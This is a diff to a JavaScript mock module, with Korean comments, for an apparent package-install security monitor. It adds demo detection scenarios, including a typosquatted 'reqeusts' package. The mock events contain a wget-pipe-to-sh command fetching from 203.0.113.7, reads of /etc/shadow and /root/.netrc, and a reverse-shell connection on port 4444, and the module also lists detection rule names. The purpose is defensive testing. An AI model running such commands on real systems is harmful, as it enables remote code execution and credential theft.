@@ -239,15 +239,21 @@
 
   // 시연 실행(DEMO_ENABLED) 시나리오 이벤트 [10/30 계약 §2 mock] — 컨테이너 없이 같은 세션 · 같은 이벤트 순서를 모의 재생. 첫 kill 판정에서 멈춘다(실제와 같게)
   //   shell: exec sh -c "wget … | sh" + open /etc/shadow / revshell: connect 203.0.113.7:4444 / direct-ip: connect 203.0.113.7:443(dstHost 없음) / domain: dns example.com(A) + connect example.com:443 / dns-exfil: 위 dnsExfil / all: 순서대로 전부
-  const DEMO_SCENARIOS = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil'];
+  // 11/04e B: benign(정상 대조군 sg-demo-benign) · chain(연쇄 규칙 시연 — 기본 정책 no-shell-download 가 1단계 wget 에서 먼저 격리) — 백엔드 GET /api/demo scenarios 순서
+  const DEMO_SCENARIOS = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil', 'benign', 'chain'];
+  const DEMO_ATTACKS = ['shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil']; // all = 이 다섯을 차례로
   const demoScenarios = {
     shell: [{ kind: 'exec', comm: 'sh', args: 'sh -c wget -q -O- http://203.0.113.7/postinstall.sh | sh' }, { kind: 'open', comm: 'python3', path: '/etc/shadow' }],
     revshell: [{ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }],
     'direct-ip': [{ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }],
     domain: [{ kind: 'dns', comm: 'python3', dstHost: 'example.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }, { kind: 'connect', comm: 'python3', dstIp: '203.0.113.34', dstPort: 443, dstHost: 'example.com' }],
     'dns-exfil': dnsExfil,
+    chain: [{ kind: 'exec', comm: 'wget', args: 'wget -q -O /tmp/.cache http://203.0.113.7/x' }, { kind: 'connect', comm: 'wget', dstIp: '203.0.113.7', dstPort: 80 }, { kind: 'open', comm: 'python3', path: '/root/.netrc' }],
   };
-  const demoEvents = (scenario) => (scenario === 'all' ? DEMO_SCENARIOS.slice(1).flatMap((k) => demoScenarios[k]) : demoScenarios[scenario] || []);
+  const demoEvents = (scenario) => (scenario === 'all' ? DEMO_ATTACKS.flatMap((k) => demoScenarios[k]) : demoScenarios[scenario] || []);
+  // 시연 한 번의 설치 · 이벤트 — benign 은 정상 패키지(pip sg-demo-benign) 설치 이벤트만, 나머지는 pip ./reqeusts 설치 시작 + 시나리오 이벤트 [11/04e B]
+  const demoPlan = (scenario) => (scenario === 'benign' ? { pkg: 'sg-demo-benign', events: pipBase('sg-demo-benign', 'sg_demo_benign') }
+    : { pkg: './reqeusts', events: [...pipBase('/pkg/reqeusts', 'reqeusts').slice(0, 2), ...demoEvents(scenario).map((a) => [a, 1])] });
   // 패키지 이름 정규화 (API 계약 「동작 규칙」): 로컬 디렉터리는 마지막 경로 이름, 버전 표기(== · 마지막 @ 뒤)는 뗀다. npm 스코프 @a/b 는 그대로
   function pkgName(raw) {
     let n = String(raw || '').trim();
@@ -395,5 +401,5 @@
   // 설치 시점 규칙(11/03 판정 3단계, 백엔드 scan/verdict.go installTimeRules 와 같다) — threat-process-hooks 는 정상 setup.py 에도 흔해 넣지 않음
   const INSTALL_TIME_RULES = ['threat-setup-', 'threat-npm-preinstall-script', 'threat-npm-dependency-confusion', 'threat-npm-http-dependency', 'threat-network-exfil', 'threat-network-dns-exfil', 'threat-network-reverse-shell', 'threat-process-download-exec', 'threat-runtime-self-propagation'];
   const isInstallTimeRule = (rule) => INSTALL_TIME_RULES.some((p) => String(rule).startsWith(p));
-  window.MOCK = { scanFixtures, isInstallTimeRule, defaultRules, evidenceTemplate, isPublic, containers, attack, dnsExfil, DNS_EXFIL_NAME, mkTimeline, DEMO_SCENARIOS, demoEvents, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
+  window.MOCK = { scanFixtures, isInstallTimeRule, defaultRules, evidenceTemplate, isPublic, containers, attack, dnsExfil, DNS_EXFIL_NAME, mkTimeline, DEMO_SCENARIOS, demoEvents, demoPlan, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
 })();
